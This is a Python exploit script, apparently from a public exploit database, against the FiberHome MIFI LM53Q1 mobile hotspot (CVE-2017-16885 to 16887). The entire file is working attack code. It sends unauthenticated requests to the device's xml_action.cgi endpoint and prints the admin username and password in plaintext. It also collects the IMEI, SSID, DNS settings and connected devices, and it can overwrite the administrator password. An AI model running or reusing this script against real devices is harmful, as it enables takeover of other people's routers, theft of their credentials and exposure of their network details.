#!/usr/bin/python

#   /$$$$$$$$ /$$ /$$                           /$$   /$$                                         /$$$$$$$                                      /$$                     /$$$$$$$$                     /$$           /$$   /$$
#  | $$_____/|__/| $$                          | $$  | $$                                        | $$__  $$                                    | $$                    | $$_____/                    | $$          |__/  | $$
#  | $$       /$$| $$$$$$$   /$$$$$$   /$$$$$$ | $$  | $$  /$$$$$$  /$$$$$$/$$$$   /$$$$$$       | $$  \ $$  /$$$$$$  /$$$$$$/$$$$   /$$$$$$  /$$$$$$    /$$$$$$       | $$       /$$   /$$  /$$$$$$ | $$  /$$$$$$  /$$ /$$$$$$
#  | $$$$$   | $$| $$__  $$ /$$__  $$ /$$__  $$| $$$$$$$$ /$$__  $$| $$_  $$_  $$ /$$__  $$      | $$$$$$$/ /$$__  $$| $$_  $$_  $$ /$$__  $$|_  $$_/   /$$__  $$      | $$$$$   |  $$ /$$/ /$$__  $$| $$ /$$__  $$| $$|_  $$_/
#  | $$__/   | $$| $$  \ $$| $$$$$$$$| $$  \__/| $$__  $$| $$  \ $$| $$ \ $$ \ $$| $$$$$$$$      | $$__  $$| $$$$$$$$| $$ \ $$ \ $$| $$  \ $$  | $$    | $$$$$$$$      | $$__/    \  $$$$/ | $$  \ $$| $$| $$  \ $$| $$  | $$
#  | $$      | $$| $$  | $$| $$_____/| $$      | $$  | $$| $$  | $$| $$ | $$ | $$| $$_____/      | $$  \ $$| $$_____/| $$ | $$ | $$| $$  | $$  | $$ /$$| $$_____/      | $$        >$$  $$ | $$  | $$| $$| $$  | $$| $$  | $$ /$$
#  | $$      | $$| $$$$$$$/|  $$$$$$$| $$      | $$  | $$|  $$$$$$/| $$ | $$ | $$|  $$$$$$$      | $$  | $$|  $$$$$$$| $$ | $$ | $$|  $$$$$$/  |  $$$$/|  $$$$$$$      | $$$$$$$$ /$$/\  $$| $$$$$$$/| $$|  $$$$$$/| $$  |  $$$$/
#  |__/      |__/|_______/  \_______/|__/      |__/  |__/ \______/ |__/ |__/ |__/ \_______/      |__/  |__/ \_______/|__/ |__/ |__/ \______/    \___/   \_______/      |________/|__/  \__/| $$____/ |__/ \______/ |__/   \___/
#                                                                                                                                                                                          | $$
#                                                                                                                                                                                          | $$
#                                                                                                                                                                                          |__/
# Exploit Title: FiberHome MIFI LM53Q1 Multiple Vulnerabilities
# Exploit Author: Ibad Shah
# Vendor Homepage: www.fiberhome.com
# Version: VH519R05C01S38
# Tested on: Linux
# Platform : Hardware
# CVE : CVE-2017-16885, CVE-2017-16886, CVE-2017-16887
# Greetz : Taimoor Zafar, Jawad Ahmed, Owais Mehtab, Aitezaz Mohsin, ZHC

import requests,sys,getopt,socket,struct

#Declaring IP as our global variable to probe for Gateway IP of Device
global ip

#Getting Gateway IP Address
def get_default_gateway_linux():
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue
            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
	return;


ip = get_default_gateway_linux()

exploit_title =  "=============================================== \n FiberHome Remote Administrator Account Details \n================================================";


#Function to get Device Statistics 
def get_device_details():

	gateway = None
	hardware = None
	device_name = None
	devices_all = ''
	version = None
	gateway = None
	ssid = ''
	dns1 = None
	dns2 = None


	requestStatus = requests.get("http://192.168.1.1/xml_action.cgi?method=get&module=duster&file=status1")
	api_response = requestStatus.content.replace('\t','').split('\n')
	for results in api_response:
        	if "<hardware_version>" in results:
                	hardware = results.replace('<hardware_version>','').replace('</hardware_version>','').replace(' ','').replace('\n','')
        	if "<device_name>" in results:
                	device_name = results.replace('<device_name>','').replace('</device_name>','').replace(' ','').replace('\n','')
        	if "<version_num>" in results:
                	version = results.replace('<version_num>','').replace('</version_num>','').replace(' ','').replace('\n','')
        	if "<gateway>" in results:
                	gateway = results.replace('<gateway>','').replace('</gateway>','').replace(' ','').replace('\n','')
        	if "<ssid>" in results:
                	ssid = results.replace('<ssid>','').replace('</ssid>','').replace('\n','')
        	if "<dns1>" in results:
                	dns1 = results.replace('<dns1>','').replace('</dns1>','').replace(' ','').replace('\n','')
        	if "<dns2>" in results:
                	dns2 = results.replace('<dns2>','').replace('</dns2>','').replace(' ','').replace('\n','')
        	if "<IMEI>" in results:
                	imei = results.replace('<IMEI>','').replace('</IMEI>','').replace(' ','').replace('\n','')
                	print "\n=============================================="

                	print "\nHardware Version of Device : "+hardware+"\n"
                	print "\nName of Device : "+device_name+"\n"
               		print "\nSoftware Version of Device : "+version+"\n"
               		print "\nIMEI of Device! : "+imei+"\n"
              		print "\nWiFi SSID of Device : "+ssid+"\n"
	                print "\nGateway of Zong Device : "+gateway+"\n"
              		print "\nDNS Primary of Device : "+dns1+"\n"
		        print "\nDNS Secondary of Device : "+dns2+"\n"
	                print "\n=============================================================================\n";
	        if "<known_devices_list>" in results:
               		devices_all = results.replace('<known_devices_list>','').replace('</known_devices_list>','').replace('\n','')
               		print "\nConnected Devices to WIFI\n"
               		print devices_all


#Function for getting User Account Details to login to Portal
def get_user_account_details():
	request = requests.get("http://"+ip+"/xml_action.cgi?method=get&module=duster&file=admin")
	admin_details = request.content.replace('\t','').split('\n')
	for admin_login_response in admin_details:
        	if "<router_username>" in admin_login_response:
                	username = admin_login_response.replace('<router_username>','').replace('</router_username>','')
        	if "<router_password>" in admin_login_response:
                	password = admin_login_response.replace('<router_password>','').replace('</router_password>','')
                	print "\nUsername of Device Web Application :\n"+username+" "
                	print "Password of Device Web Application :\n"+password+"\n"
                	print "\n=============================================================================\n";


#Function to change Administrator Password 

def change_admin_password():
	set_password = raw_input("\nEnter Password to Change : ")
	password = str(set_password)
	xml = "<?xml version='1.0' encoding='UTF-8'?><RGW><management><router_password>"+password+"</router_password></management></RGW>"
	headers = {'Content-Type': 'application/xml'} 
	change_password_request = requests.post("http://"+ip+"/xml_action.cgi?method=set&module=duster&file=admin", data=xml, headers=headers).text
	print "Password Changed!"


def main():

	print exploit_title
	print "\nSelect Menu For Fetching Details \n \n 1. Get Portal Login & Password. \n 2. Get Other Details. \n 3. Change Admin Password for Device"

	get_option = raw_input("\n Enter Option :  ");

	option = int(get_option)

	if get_option == "1":

        	get_user_account_details()

        	raw_input("\n Press Any Key To Exit");

	elif get_option == "2":

        	get_device_details()

        	raw_input("\n Press Any Key To Exit");

	elif get_option == "3":

		change_admin_password()

	elif get_option == "":

		print "Good Bye!";

	else:

		print "Goodbye!";

main()
